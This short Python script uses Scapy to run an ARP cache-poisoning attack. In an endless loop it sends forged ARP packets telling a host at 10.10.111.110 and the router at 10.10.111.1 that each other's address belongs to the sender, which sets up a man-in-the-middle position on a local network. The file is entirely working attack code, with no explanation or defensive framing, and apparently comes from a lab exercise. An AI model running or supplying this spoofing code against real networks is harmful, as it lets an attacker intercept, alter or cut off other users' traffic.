import sys 
from scapy.all import *
arpXP=ARP()
arpRTR=ARP()
arpXP.psrc="10.10.111.1"
arpXP.pdst="10.10.111.110"
arpXP.hwdst="ff:ff:ff:ff:ff:ff"
arpRTR.psrc="10.10.111.110"
arpRTR.pdst="10.10.111.1"
arpRTR.hwdst="ff:ff:ff:ff:ff:ff"
while True:
	send(arpXP)
	send(arpRTR)
